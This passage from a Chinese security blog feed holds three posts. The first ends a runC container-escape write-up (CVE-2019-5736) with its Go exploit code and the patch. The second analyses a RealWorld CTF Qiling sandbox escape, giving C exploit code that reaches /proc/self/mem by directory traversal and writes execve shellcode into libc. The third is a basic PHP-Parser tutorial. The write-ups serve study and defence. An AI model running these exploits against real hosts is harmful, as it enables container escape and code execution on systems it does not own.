fmt.Println("[+] Overwritten /bin/sh successfully")        // Loop through all processes to find one whose cmdline includes runcinit        // This will be the process created by runc        var found int        for found == 0 {                pids, err := ioutil.ReadDir("/proc")                if err != nil {                        fmt.Println(err)                        return                }                for _, f := range pids {                        fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")                        fstring := string(fbytes)                        if strings.Contains(fstring, "runc") {                                fmt.Println("[+] Found the PID:", f.Name())                                found, err = strconv.Atoi(f.Name())                                if err != nil {                                        fmt.Println(err)                                        return                                }                        }                }        }        // We will use the pid to get a file handle for runc on the host.        var handleFd = -1        for handleFd == -1 {                // Note, you do not need to use the O_PATH flag for the exploit to work.                handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)                if int(handle.Fd()) &gt; 0 {                        handleFd = int(handle.Fd())                }        }        fmt.Println("[+] Successfully got the file handle")        // Now that we have the file handle, lets write to the runc binary and overwrite it        // It will maintain it's executable flag        for {                writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)                if int(writeHandle.Fd()) &gt; 0 {                        fmt.Println("[+] Successfully got write handle", writeHandle)                        writeHandle.Write([]byte(payload))                        return                }        }}</code></pre><p>POC思路：</p><ol><li>首先覆盖容器中的/bin/sh为#!/proc/self/exe。</li><li>遍历/proc下的目录找到runC相关进程</li><li>打开/proc下相关的exe文件获得fd</li><li>循环写入 fd，直到runC解除占用，成功写入</li><li>runc最后将执行用户通过docker exec指定的/bin/sh，它的内容在第1步中已经被替换成#!/proc/self/exe，因此实际上将执行宿主机上的runc，而runc也已经在第4部中被我们覆盖掉了。</li></ol><h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p>具体补丁详情：<a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p><pre><code class="c">void nsexec(void){    int pipenum;    @@ -549,6 +552,14 @@ void nsexec(void)    if (pipenum == -1)        return;    /*     * We need to re-exec if we are not in a cloned binary. This is necessary     * to ensure that containers won't be able to access the host binary     * through /proc/self/exe. See CVE-2019-5736.     */    if (ensure_cloned_binary() &lt; 0)        bail("could not ensure we are a cloned binary");    /* Parse all of the netlink configuration. */    nl_parse(pipenum, &amp;config);</code></pre><p>​        可以看到主要是增加了一个ensure_cloned_binary()函数的判断其中主要的逻辑是通过memfd_create来将让runc在容器内执行操作前首先将自己复制成为一个匿名文件，如此在可以达到原来效果的同时，/proc/self/exe无法触达到原本的<br>runC二进制文件。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>​        为了对容器进行有效控制通过宿主机进行容器内外的进程切换其实是必然的，但是稍有不慎就会导致容器信息外带在进程的上下文中，runC的这个漏洞是一个例子还有一个例子就是docker cp漏洞，它本身也是因为docker-tar进程将相关的共享库内容外带到了宿主机导致了容器逃逸，因此在考虑容器安全问题时，对这些危险进程的监控也是十分必要的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;容器进程切换思考&quot;&gt;&lt;a href=&quot;#容器进程切换思考&quot; class=&quot;headerlink&quot; title=&quot;容器进程切换思考&quot;&gt;&lt;/a&gt;容器进程切换思考&lt;/h1&gt;&lt;h2 id=&quot;前置技术&quot;&gt;&lt;a href=&quot;#前置技术&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="容器安全" scheme="https://rainsec.cn/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="容器安全" scheme="https://rainsec.cn/tags/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RealWorld CTF之qiling框架分析</title>
    <link href="https://rainsec.cn/post/Qilin%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/Qilin%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html</id>
    <published>2022-01-28T10:48:45.000Z</published>
    <updated>2022-07-22T11:57:45.998Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RealWorld-CTF之qiling框架分析"><a href="#RealWorld-CTF之qiling框架分析" class="headerlink" title="RealWorld CTF之qiling框架分析"></a>RealWorld CTF之qiling框架分析</h1><h2 id="qiling"><a href="#qiling" class="headerlink" title="qiling"></a>qiling</h2><p>​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。</p><pre><code class="python">#!/usr/bin/env python3import osimport sysimport base64import tempfile# pip install qiling==1.4.1from qiling import Qilingdef my_sandbox(path, rootfs):    ql = Qiling([path], rootfs)    ql.run()def main():    sys.stdout.write('Your Binary(base64):\n')    line = sys.stdin.readline()    binary = base64.b64decode(line.strip())        with tempfile.TemporaryDirectory() as tmp_dir:        fp = os.path.join(tmp_dir, 'bin')        with open(fp, 'wb') as f:            f.write(binary)        my_sandbox(fp, tmp_dir)if __name__ == '__main__':    main()</code></pre><p>大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）：</p><ol><li>在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。</li><li>设置运行参数</li><li>设置需要的roofs目录，这里也是出问题的一个关键点</li><li>设置操作系统和结构</li><li>设置大小端序和机器长度</li><li>初始化QlCoreStructs结构体，主要是用来pack的</li><li>加载loader，主要就是根据os type导入loader文件夹下的不同文件。</li><li>log日志操作</li><li>加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载）</li><li>根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下</li><li>根据interpreter成员来决定是否初始化QlCoreHooks</li><li>启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。</li><li>根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件</li></ol><p>上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run）</p><p>在QlOsLinux类里面找到相应的run函数：</p><pre><code class="python">    def run(self):        if self.ql.exit_point is not None:            self.exit_point = self.ql.exit_point        try:            if self.ql.code:                self.ql.emu_start(self.entry_point, (self.entry_point + len(self.ql.code)), self.ql.timeout, self.ql.count)            else:                if self.ql.multithread == True:                    # start multithreading                    thread_management = thread.QlLinuxThreadManagement(self.ql)                    self.ql.os.thread_management = thread_management                    thread_management.run()                else:                    if  self.ql.entry_point is not None:                        self.ql.loader.elf_entry = self.ql.entry_point                    elif self.ql.loader.elf_entry != self.ql.loader.entry_point:                        entry_address = self.ql.loader.elf_entry                        if self.ql.archtype == QL_ARCH.ARM and entry_address &amp; 1 == 1:                            entry_address -= 1                        self.ql.emu_start(self.ql.loader.entry_point, entry_address, self.ql.timeout)                        self.ql.enable_lib_patch()                        self.run_function_after_load()                        self.ql.loader.skip_exit_check = False                        self.ql.write_exit_trap()                    self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)</code></pre><p>看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。</p><pre><code class="python">        # X8664        elif self.ql.archtype == QL_ARCH.X8664:            self.gdtm = GDTManager(self.ql)            ql_x86_register_cs(self)            ql_x86_register_ds_ss_es(self)            self.ql.hook_insn(self.hook_syscall, UC_X86_INS_SYSCALL)            # Keep test for _cc            #self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL)            self.thread_class = thread.QlLinuxX8664Thread                 def hook_syscall(self, ql, intno = None):        return self.load_syscall()</code></pre><p>load_syscall本身比较复杂，通过代码可以看出它都实现了那些<a href="https://github.com/qilingframework/qiling/blob/master/qiling/os/linux/map_syscall.py">syscall</a>，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数<a href="https://github.com/qilingframework/qiling/blob/839e45ed86e56304b93f81a53cf08383d942a494/qiling/os/posix/posix.py#L173">实现</a>，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin1.png" alt="image-20220125165540628"></p><p>其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​以qiling实现的<a href="https://github.com/qilingframework/qiling/blob/94bf7a3bc4e3ea0cffaaa52dbc477c11030f631b/qiling/os/posix/syscall/fcntl.py#L15">ql_syscall_open</a>为例子：</p><pre><code class="python">def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int):    path = ql.os.utils.read_cstring(filename)    real_path = ql.os.path.transform_to_real_path(path)    relative_path = ql.os.path.transform_to_relative_path(path)    flags &amp;= 0xffffffff    mode &amp;= 0xffffffff    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)    if idx == -1:        regreturn = -EMFILE    else:        try:            if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX:                mode = 0            #flags = ql_open_flag_mapping(ql, flags)            flags = ql_open_flag_mapping(ql, flags)            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)            regreturn = idx        except QlSyscallError as e:            regreturn = - e.errno    ql.log.debug("open(%s, 0o%o) = %d" % (relative_path, mode, regreturn))    if regreturn &gt;= 0 and regreturn != 2:        ql.log.debug(f'File found: {real_path:s}')    else:        ql.log.debug(f'File not found {real_path:s}')    return regreturn</code></pre><p>首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。</p><p>其大致的函数调用链如下：</p><blockquote><p>ql_syscall_open –&gt;  open_ql_file —&gt; os.open</p></blockquote><pre><code class="python">    def open_ql_file(self, path, openflags, openmode, dir_fd=None):        if self.has_mapping(path):            self.ql.log.info(f"mapping {path}")            return self._open_mapping_ql_file(path, openflags, openmode)        else:            if dir_fd:                return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)            real_path = self.ql.os.path.transform_to_real_path(path)            return ql_file.open(real_path, openflags, openmode)</code></pre><p>在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。</p><pre><code class="python">    def transform_to_real_path(self, path: str) -&gt; str:        real_path = self.convert_path(self.ql.rootfs, self.cwd, path).......        return str(real_path.absolute())</code></pre><p>但是真正的隔离其实是convert_path实现的：</p><pre><code class="python">    @staticmethod    def convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:        _rootfs = Path(rootfs)        _cwd = PurePosixPath(cwd[1:])        _path = Path(path)        if _path.is_absolute():            return _rootfs / QlPathManager.normalize(_path)        else:            return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())    def convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:        emulated_os = self.ql.ostype        hosting_os = self.ql.platform_os        # emulated os and hosting platform are of the same type        if  (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX):            return QlPathManager.convert_for_native_os(rootfs, cwd, path)        elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS:            return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)        elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX:            return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)        else:            return QlPathManager.convert_for_native_os(rootfs, cwd, path)</code></pre><p>这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin2.png" alt="image-20220125190221473"></p><pre><code class="python">    def normalize(path: Union[Path, PurePath]) -&gt; Union[Path, PurePath]:        # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath        assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here'        normalized_path = type(path)()        # remove anchor (necessary for Windows UNC paths) and convert to relative path        if path.is_absolute():            path = path.relative_to(path.anchor)        for p in path.parts:            if p == '.':                continue            if p == '..':                normalized_path = normalized_path.parent                continue            normalized_path /= p        return normalized_path</code></pre><p>符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​        在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";unsigned char code[] = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x1\x1\x81\x34\x24\x1\x1\x1\x1\x31\xf6\x56\x6a\x8\x5e\x48\x1\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\xf\x5";int main() {    char buf[4096] = "0";    int fd = open("/proc/self/maps", O_RDONLY);    int fd_mem = open("/proc/self/mem", O_RDWR);    FILE *fp_map = fdopen(fd, "r");    unsigned long addr = 0;    while(1) {        fgets(buf, sizeof buf, fp_map);        if (strstr(buf, "r-xp")!=NULL &amp;&amp; strstr(buf, "libc-")) {            sscanf(buf, "%lx-", &amp;addr);            break;        }    }    lseek(fd_mem, addr, SEEK_SET);    for (int i=0; i&lt;150; i++) {        write(fd_mem, nop, sizeof nop - 1);    }    write(fd_mem, code, sizeof code);    return 0;}</code></pre><p>不过大家可能会好奇，mem的权限为啥允许写入shellcode：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin3.png" alt="image-20220127104107416"></p><p>答案可以参考这篇文章：</p><blockquote><p><a href="https://www.anquanke.com/post/id/257350#h2-0">https://www.anquanke.com/post/id/257350#h2-0</a></p></blockquote><p>至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。</p><pre><code class="c">int main() {    long start_addr;    // Open mappings    int map = openat(1, "/proc/self/maps", O_RDONLY);    // Open Python process memory    int mem = openat(1, "/proc/self/mem", O_RDWR);    FILE *fp_map = fdopen(map, "r");    // Find the first executable mapping for Libc    char line[4096];    while (fgets(line, sizeof line, fp_map)) {        size_t len = strlen(line);        if (strstr(line, "r-xp") != NULL &amp;&amp; strstr(line, "libc-")) {            // Retrive start address of mapping            sscanf(line, "%lx-", &amp;start_addr);            printf("%lx\n", start_addr);            break;        }    }    // Seek to the address of the executable mapping for Libc    lseek(mem, start_addr, SEEK_SET);    for(int i=0; i &lt; 3; i++) {        write(mem, nop, sizeof nop -1);    }    // Write the payload into the executable mapping    write(mem, code, sizeof code);    return 0;}</code></pre><p>shellcode就不贴了，占地方，可以参考上面那个demo里面的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复：</p><blockquote><p><a href="https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe">https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RealWorld-CTF之qiling框架分析&quot;&gt;&lt;a href=&quot;#RealWorld-CTF之qiling框架分析&quot; class=&quot;headerlink&quot; title=&quot;RealWorld CTF之qiling框架分析&quot;&gt;&lt;/a&gt;RealWorld CTF之</summary>
      
    
    
    
    <category term="CTF" scheme="https://rainsec.cn/categories/CTF/"/>
    
    <category term="容器安全" scheme="https://rainsec.cn/categories/CTF/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="https://rainsec.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-Parser的基本使用</title>
    <link href="https://rainsec.cn/post/PHP-Parser.html"/>
    <id>https://rainsec.cn/post/PHP-Parser.html</id>
    <published>2022-01-28T10:38:45.000Z</published>
    <updated>2022-07-20T11:20:04.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h1><p>PHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。</p><span id="more"></span><h2 id="What-is-PHP-Parser"><a href="#What-is-PHP-Parser" class="headerlink" title="What is PHP-Parser"></a>What is PHP-Parser</h2><p><code>PHP-Parser</code>是<code>nikic</code>用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作</p><h2 id="PHP-Parser的基础使用"><a href="#PHP-Parser的基础使用" class="headerlink" title="PHP-Parser的基础使用"></a>PHP-Parser的基础使用</h2><p>这里先贴一下官方文档</p><p><a href="https://github.com/nikic/PHP-Parser/tree/master/doc">PHP-Parser/doc at master · nikic/PHP-Parser (github.com)</a></p><p>最基本的是要理解其中<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Walking_the_AST.markdown">Walking the AST</a>的部分</p><h2 id="初始化解析器"><a href="#初始化解析器" class="headerlink" title="初始化解析器"></a>初始化解析器</h2><p>首先创建实例</p><pre><code class="php">use PhpParser\ParserFactory;$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</code></pre><p>这其中有以下参数</p><p>KindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5.</p><p>create还有一个参数Lexer，这里先不做讨论</p><p>在实例化之后我们就可以通过</p><pre><code class="php">$stmts = $parser-&gt;parse($code);</code></pre><p>来将代码转换成AST</p><p>为了防止抛出异常，最好在try….catch中执行</p><h3 id="生成更加直观的AST"><a href="#生成更加直观的AST" class="headerlink" title="生成更加直观的AST"></a>生成更加直观的AST</h3><p>当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST</p><p>这里需要使用NodeDump</p><p>对于代码</p><pre><code class="PHP">&lt;?phpfunction printLine($msg) {    echo $msg, "\n";}printLine('Hello World!!!');</code></pre><p>将其转换为AST</p><pre><code class="PHP">&lt;?phpuse PhpParser\NodeDumper;$nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), "\n";</code></pre><p>得到以下输出</p><pre><code class="YAML">array(    0: Stmt_Function(        byRef: false        name: Identifier(            name: printLine        )        params: array(            0: Param(                type: null                byRef: false                variadic: false                var: Expr_Variable(                    name: msg                )                default: null            )        )        returnType: null        stmts: array(            0: Stmt_Echo(                exprs: array(                    0: Expr_Variable(                        name: msg                    )                    1: Scalar_String(                        value:                    )                )            )        )    )    1: Stmt_Expression(        expr: Expr_FuncCall(            name: Name(                parts: array(                    0: printLine                )            )            args: array(                0: Arg(                    value: Scalar_String(                        value: Hello World!!!                    )                    byRef: false                    unpack: false                )            )        )    ))</code></pre><h3 id="Node-tree-structure"><a href="#Node-tree-structure" class="headerlink" title="Node tree structure"></a>Node tree structure</h3><p>上面我们可以看到生成了很多的Node类型</p><p>PHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类：</p><ul><li><p><code>PhpParser\Node\Stmts</code>是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。</p></li><li><p><code>PhpParser\Node\expr</code>是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：<code>$var (PhpParser\Node\Expr\Variable)</code>和<code>func() (PhpParser\Node\Expr\FuncCall)</code>。</p></li><li><p><code>PhpParser\Node\Scalars</code>是表示标量值的节点，如<code>"string" (PhpParser\Node\scalar\string)</code>、<code>0 (PhpParser\Node\scalar\LNumber)</code> 或魔术常量，如”<strong>FILE</strong>“ <code>(PhpParser\Node\scalar\MagicConst\FILE)</code> 。所有<code>PhpParser\Node\scalar</code>都是延伸自<code>PhpParser\Node\Expr</code>，因为scalar也是表达式。</p></li><li><p>需要注意的是<code>PhpParser\Node\Name</code>和<code>PhpParser\Node\Arg</code>不在以上的节点之中</p></li></ul><h3 id="Pretty-printer"><a href="#Pretty-printer" class="headerlink" title="Pretty printer"></a>Pretty printer</h3><p>Prettyprinter用来将我们修改后的AST转换回PHP代码，使用如下</p><pre><code class="php">use PhpParser\Error;use PhpParser\ParserFactory;use PhpParser\PrettyPrinter;$code = "&lt;?php echo 'Hi ', hi\\getTarget();";$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\Standard;try {    //生成AST    $stmts = $parser-&gt;parse($code);    //对节点进行操作    $stmts[0]         // the echo statement          -&gt;exprs     // sub expressions          [0]         // the first of them (the string node)          -&gt;value     // it's value, i.e. 'Hi '          = 'Hello '; // change to 'Hello '    // pretty print    $code = $prettyPrinter-&gt;prettyPrint($stmts);    echo $code;} catch (Error $e) {    echo 'Parse Error: ', $e-&gt;getMessage();}</code></pre><p>在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型</p><p>此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点</p><p>例如当你需要提取全局变量时</p><pre><code class="PHP">&lt;?php    $a = $_POST['a'];</code></pre><p>他的语法树如下</p><pre><code class="YAML">0: Stmt_Expression(        expr: Expr_Assign(            var: Expr_Variable(                name: a            )            expr: Expr_ArrayDimFetch(                var: Expr_Variable(                    name: _POST                )                dim: Scalar_String(                    value: a                )            )        )    